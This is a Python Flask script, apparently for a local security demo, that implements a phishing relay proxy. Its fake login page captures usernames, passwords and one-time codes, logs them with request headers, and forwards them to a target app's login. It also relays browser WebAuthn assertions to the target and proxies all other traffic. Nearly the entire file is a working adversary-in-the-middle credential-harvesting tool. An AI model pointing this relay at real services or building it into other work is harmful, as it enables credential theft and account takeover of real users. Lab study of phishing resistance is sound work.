# relay.py
# MITM/relay proxy for demo. For local testing only.
from flask import Flask, request, render_template_string, jsonify, Response
import requests, os, time, json

# Configuration: change TARGET if your real app runs elsewhere
TARGET = "http://127.0.0.1:5001"
RELAY_HOST = "127.0.0.1"
RELAY_PORT = 4000

app = Flask(__name__)
LOG_DIR = "artifacts/mitm"
os.makedirs(LOG_DIR, exist_ok=True)

# Simple phishing HTML served at root for manual tests
LOGIN_HTML = """
<!doctype html>
<html>
  <body>
    <h2>Fake Login (Phishing) — Relay Demo</h2>
    <form method="post" action="/phish-login">
      <label>username <input name="username"></label><br/>
      <label>password <input type="password" name="password"></label><br/>
      <label>otp <input name="otp"></label><br/>
      <button type="submit">Login (phish)</button>
    </form>

    <hr/>
    <h2>Fake WebAuthn (Phishing)</h2>
    <label>username <input id="phish-username" name="username" value="alice"></label><br/>
    <button id="webauthn-login">Try WebAuthn (phish)</button>

    <script>
    // minimal base64url helpers (only for demo)
    function b64uToBuffer(b64u) {
      b64u = b64u.replace(/-/g, "+").replace(/_/g, "/");
      while (b64u.length % 4) b64u += "=";
      const str = atob(b64u);
      const arr = new Uint8Array(str.length);
      for (let i = 0; i < str.length; i++) arr[i] = str.charCodeAt(i);
      return arr.buffer;
    }
    function bufToB64u(buf) {
      const bytes = new Uint8Array(buf);
      let s = '';
      for (let i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
      let b64 = btoa(s);
      return b64.replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
    }

    async function phishWebAuthn() {
      const username = document.getElementById('phish-username').value || 'alice';
      try {
        // fetch options from real site
        const optsResp = await fetch("{{TARGET}}/webauthn/auth/options", {
          method: "POST",
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({username})
        });
        const options = await optsResp.json();
        console.log('options from real site', options);

        // convert challenge + allowCredentials ids
        options.publicKey.challenge = b64uToBuffer(options.publicKey.challenge);
        if (options.publicKey.allowCredentials) {
          options.publicKey.allowCredentials = options.publicKey.allowCredentials.map(c => ({
            id: b64uToBuffer(c.id), type: c.type, transports: c.transports
          }));
        }

        const assertion = await navigator.credentials.get({ publicKey: options.publicKey });

        // prepare payload (base64url)
        const payload = {
          id: assertion.id,
          rawId: bufToB64u(assertion.rawId),
          type: assertion.type,
          response: {
            authenticatorData: bufToB64u(assertion.response.authenticatorData),
            clientDataJSON: bufToB64u(assertion.response.clientDataJSON),
            signature: bufToB64u(assertion.response.signature),
            userHandle: assertion.response.userHandle ? bufToB64u(assertion.response.userHandle) : null
          }
        };

        // send to relay endpoint which will forward to real server
        const forward = await fetch('/phish-webauthn', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(payload)
        });
        const j = await forward.json();
        alert('Relayed WebAuthn -> server returned: ' + JSON.stringify(j));
      } catch (e) {
        console.error('WebAuthn phish attempt failed', e);
        alert('WebAuthn phish attempt failed: ' + e);
      }
    }

    document.getElementById('webauthn-login').onclick = phishWebAuthn;
    </script>
  </body>
</html>
""".replace("{{TARGET}}", TARGET)  # inject TARGET for client fetch in demo

def _log(name, data):
    ts = time.strftime("%Y%m%d-%H%M%S")
    fn = os.path.join(LOG_DIR, f"{ts}-{name}.json")
    with open(fn, "w") as f:
        json.dump(data, f, indent=2)
    print(f"[relay] logged {fn}")
    return fn

@app.route("/", methods=["GET"])
def index():
    return render_template_string(LOGIN_HTML)

# endpoint that captures posted OTP/password form and forwards to real app login
@app.route("/phish-login", methods=["POST"])
def phish_login():
    payload = {"username": request.form.get("username"), "password": request.form.get("password"), "otp": request.form.get("otp")}
    _log("captured_otp", {"headers": dict(request.headers), "payload": payload})
    try:
        resp = requests.post(f"{TARGET}/auth/login", data=payload, allow_redirects=False)
        _log("forwarded_otp_response", {"status": resp.status_code, "text": resp.text, "headers": dict(resp.headers)})
        return f"Phish captured and forwarded (status {resp.status_code}). Check artifacts/mitm"
    except Exception as e:
        _log("forward_error", {"error": str(e)})
        return "Forward error", 500

# endpoint that captures WebAuthn assertion JSON and forwards to real server
@app.route("/phish-webauthn", methods=["POST"])
def phish_webauthn():
    body = request.get_json()
    _log("captured_webauthn", {"headers": dict(request.headers), "body": body})
    try:
        resp = requests.post(f"{TARGET}/webauthn/auth/complete", json=body)
        _log("forwarded_webauthn_response", {"status": resp.status_code, "text": resp.text})
        return jsonify({"forward_status": resp.status_code, "forward_text": resp.text})
    except Exception as e:
        _log("forward_error_webauthn", {"error": str(e)})
        return jsonify({"error": str(e)}), 500

# ===== catch-all proxy: forwards ANY other path to the TARGET server =====
@app.route("/<path:path>", methods=["GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"])
def proxy_all(path):
    # construct target URL preserving path
    target_url = f"{TARGET}/{path}"
    print(f"[RELAY] Incoming: {request.method} {request.path} -> {target_url}")

    # headers: forward most headers but allow requests to set Host appropriately
    headers = {k: v for k, v in request.headers.items() if k.lower() != "host"}
    data = request.get_data()
    params = request.args

    try:
        resp = requests.request(
            method=request.method,
            url=target_url,
            headers=headers,
            params=params,
            data=data,
            cookies=request.cookies,
            allow_redirects=False,
            timeout=10
        )
    except Exception as e:
        print(f"[RELAY] Forward error: {e}")
        return f"Forward error: {e}", 502

    print(f"[RELAY] Forwarded: {request.method} {path} -> {resp.status_code}")

    excluded = ["content-encoding", "content-length", "transfer-encoding", "connection"]
    response_headers = [(k, v) for k, v in resp.headers.items() if k.lower() not in excluded]
    return Response(resp.content, resp.status_code, response_headers)

if __name__ == "__main__":
    print(f"Relay proxy running on http://{RELAY_HOST}:{RELAY_PORT}, forwarding to {TARGET}")
    app.run(host=RELAY_HOST, port=RELAY_PORT, debug=True)
